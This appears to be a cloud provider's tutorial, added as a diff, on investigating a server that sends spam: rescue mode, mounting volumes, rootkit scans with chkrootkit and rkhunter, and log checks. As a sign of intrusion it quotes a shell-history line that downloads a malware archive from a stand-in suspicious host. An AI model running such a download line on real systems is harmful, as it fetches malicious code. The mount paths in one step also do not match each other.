@@ -1,0 +1,188 @@
+---
+title: Stopping outgoing spam
+description: This page provides information on how to identify and stop abusive usage of your Instances.
+tags: Instances spam
+products:
+  - compute
+dates:
+  validation: 2024-04-22
+  posted: 2020-08-24
+  validation_frequency: 24
+---
+
+While the most widely recognized form of spam is email spam, other spam types exist, such as Usenet newsgroup spam, spam in communities, spam in blog comments, and much more. Users concerned by spam can contact the abuse helpdesk of the service provider (unknowingly), hosting the machines being abused to distribute these messages. The service provider will inform his customer about the situation. If you have received an abuse complaint about spam, immediate action from your side is required to stop the transmission of these unsolicited messages and secure your system.
+
+### Understanding what is going on
+
+When you receive an abuse alert for spam on one of your machines, an intruder likely gained access to it by either guessing your passwords or by using a security hole that may be present in one of your applications.
+
+Your immediate action is required in this case to stop the spam outgoing from the machine. It is recommended to boot the machine in **rescue mode**, to interrupt the outgoing connections as a first step, before proceeding with more in-depth investigations into what is going on:
+
+- [Rescue Mode on Instances](/instances/how-to/use-boot-modes/)
+- [Rescue Mode on Elastic Metal servers](/elastic-metal/how-to/reboot-server/)
+- [Rescue Mode on Dedibox dedicated servers](/dedibox/how-to/use-rescue-mode/)
+
+The rescue mode is a small Linux distribution, based on Ubuntu Linux, that runs directly in your server's RAM. It allows you to check your machine in a secure environment without being in a potentially infected environment.  
+Once the server has booted into rescue mode, connect to it using SSH (depending on your product, the username, and password required for the connection are displayed in the console.)
+
+## Mounting volumes 
+
+Mount the volumes of the server to have access to your files:
+
+### On Instances
+
+1. Retrieve a list of all available volumes on your Instance by running the command `lsblk`:
+    <Message type="note">
+      The devices of your Instance are named, depending on the Instance type you use.
+    </Message>
+
+    ```
+    NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+    vda     253:0    0 18.6G  0 disk
+    ├─vda1  253:1    0 18.5G  0 part
+    └─vda15 253:15   0  100M  0 part
+    ```
+2. Mount the device `vda1` manually as `/mnt/data` by running the following commands:
+    ```
+    mkdir -p /mnt/volume0
+    mount /dev/vda1 /mnt/vdata
+    ```
+3. Verify if the volume has been mounted correctly, by running the `lsblk` command again:
+    ```
+    NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+    vda     253:0    0 18.6G  0 disk
+    ├─vda1  253:1    0 18.5G  0 part /mnt/data
+    └─vda15 253:15   0  100M  0 part
+    ```
+
+The server is now running in rescue mode, the volume that requires debug/rescue action is mounted in the `/mnt/data`.
+
+### On Elastic Metal and Dedibox servers
+
+1. Once connected to the server run the script `mountall.sh` to automatically mount all available partitions of the disk. A message like the following confirms if the partitions are mounted:
+    ```
+    /dev/md0 ne peut être monté.
+    /dev/md125 vient d'être monté dans /mnt/md125
+    /dev/md126 vient d'être monté dans /mnt/md126
+    /dev/md127 vient d'être monté dans /mnt/md127
+    ```
+2. Check if the partitions have been mounted correctly, by running the `lsblk` command:
+    ```
+    NAME      MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
+    loop0       7:0    0 523.6M  1 loop  /lib/live/mount/rootfs/img.current.squashfs
+    sda         8:0    0 238.5G  0 disk
+    ├─sda1      8:1    0   299M  0 part
+    │ └─md127   9:127  0   298M  0 raid1 /mnt/md127
+    ├─sda2      8:2    0    30G  0 part
+    │ └─md126   9:126  0    30G  0 raid1 /mnt/md126
+    ├─sda3      8:3    0 207.7G  0 part
+    │ └─md125   9:125  0 207.6G  0 raid1 /mnt/md125
+    └─sda4      8:4    0   512M  0 part  [SWAP]
+    sdb         8:16   0 238.5G  0 disk
+    ├─sdb1      8:17   0   299M  0 part
+    │ └─md127   9:127  0   298M  0 raid1 /mnt/md127
+    ├─sdb2      8:18   0    30G  0 part
+    │ └─md126   9:126  0    30G  0 raid1 /mnt/md126
+    ├─sdb3      8:19   0 207.7G  0 part
+    │ └─md125   9:125  0 207.6G  0 raid1 /mnt/md125
+    └─sdb4      8:20   0   512M  0 part  [SWAP]
+    ```
+
+The server is now running in rescue mode, your data is accessible and you can launch your investigations.
+
+## Checking if there are any known security holes
+
+Often intruders use security holes in software applications running on your Instances or servers to gain access to the machine, such as weak PHP scripts or other apps installed on your machine. A trustful source to find information if there are known issues on the software you are using is the [CVE (Common Vulnerabilities and Exposures) database](https://cve.mitre.org/). It provides a listing of vulnerabilities of the most popular software. You may also check the software publishers' websites for any known issues with the tools.
+
+The attacker may have installed a collection of, typically malicious software called rootkit on your system. A rootkit is a software designed to enable access to a computer that is not otherwise allowed and allows the attacker to take control of your machine and execute commands on it. Rootkit detection is a difficult task, as it often masks its existence or other malicious software. We use `chkrootkit` and `rkhunter` to check if no rootkits are present on the system.
+
+### Scanning for Rootkits using chkrootkit
+
+`chkrootkit` is an application to scan your system for the presence of signs of a rootkit infection.
+
+1. Install `chkrootkit` using the APT package manager:
+    ```
+    apt install chkrootkit
+    ```
+2. Run `chkrootkit` on your mounted volume.
+    ```
+    chkrootkit -r /mnt/data
+    ```
+
+    The application checks your system for the presence of different rootkits. The following messages are printed out during these tests:
+
+    - `INFECTED`: The application identified a command probably infected by a known rootkit
+    - `not infected`: The test did not find any known rootkit signature
+    - `not found`: The command to be tested is not found
+    - `Vulnerable but disabled`: The command is infected but not in use (not running or commented in inetd.conf)
+    - `not tested`: The test was not performed
+
+    The last output might happen if one or several of the following conditions are matched:
+
+    - The test is OS-specific.
+    - An external program on which the test relies is not available.
+    - Specific command-line options are provided (e.g. -r).
+
+    For more information on `chkrootkit`, refer to the [official documentation](http://www.chkrootkit.org/README).
+
+### Scanning for rootkits using rkhunter
+
+Another method to check if a system is infected with a rootkit is the application `rkhunter`.
+
+1. Install `rkunter` using the APT package manager:
+    ```
+    apt install rkhunter
+    ```
+2. Run `rkuhnter` on your mounted volume:
+    ```
+    rkhunter -c -r /mnt/data
+    ```
+
+The application runs various checks on the file system to identify files that have deviated from the expected defaults. Following the test, a summarized test report displays. A full log of the tests performed is available in the file `/var/log/rkhunter.log`. For more information on using rkhunter, refer to the official [rkhunter website](http://rkhunter.sourceforge.net/).
+
+### Checking for suspicious files
+
+To get information on the amount of spam sent by the intruder and to see any suspicious logs, it is useful to check the servers' log-files for unusual entries.
+
+The log-files are located in the `/var/log` directory. Different applications create their own log files. You can use the `ls -la` command to retrieve a list of all files and folders available in the directory.
+
+Visualize the content by opening the file in a text editor. Remember that you are on a temporary OS, and to access the file, you should specify the full file path:
+
+```
+nano /mnt/data/var/log/lastlog
+```
+
+Suspicious files might be present, for example, in the `/tmp`, `/var`, and `/var/spool/cron` directories. Check these directories using the `ls -la` command to retrieve a list of all files and folders present in these directories and look out for unusual file names or files you do not know.
+
+You can also use the `find` command to detect files that have been modified recently. To get information about files in the `/etc` directory that have been modified in the past 48 hours by the user `root`, use the following command:
+
+```
+find /mnt/data/etc -user root -mtime -2
+```
+
+### Checking command history
+
+To get more information on what the intruder did on your system, you can check which commands were executed using the `.bash_history` file. This file, existing for each user on the system, contains a log of all commands executed on the machine. It is located in the home directory of each user. The most important one is, obviously, the one belonging to the `root` user of the system. Use `tail` to display the latest 50 lines of the file. If required you can increase this number:
+
+```
+tail -n 50 /mnt/data/root/.bash_history
+```
+
+Check the file for unusual entries such as the following examples:
+
+```
+tar xfz rootkit.tar.gz
+wget http://suspicious.server.com/malware.zip
+```
+
+It is also possible to check if the intruder installed software using the APT package manager on Debian/Ubuntu-based systems. Check the content of this file for any suspicious activities like the installation or uninstallation of software unknown to you. Use the `tail` command to display the last 50 lines in the file, if required increase this limit:
+
+```
+tail -n 50 /mnt/data/var/log/dpkg.log
+```
+
+## Conclusion
+
+In this tutorial, you have learned how to check your server for suspicious files and potential rootkits. It is important that you clean your machine carefully before rebooting it into "normal" mode, as your server will continue to send spam if the machine is not thoroughly cleaned. It is recommended for security reasons to reinstall an infected server with a clean and fresh operating system and restore your application from your backups.
+
+Remember always to use strong passwords, protect your server against any intrusion, do not keep unnecessary services running on it, and configure an additional layer of security by installing and configuring a [firewall](/tutorials/installation-uncomplicated-firewall/) and tools like [fail2ban](/tutorials/protect-server-fail2ban/) on it.
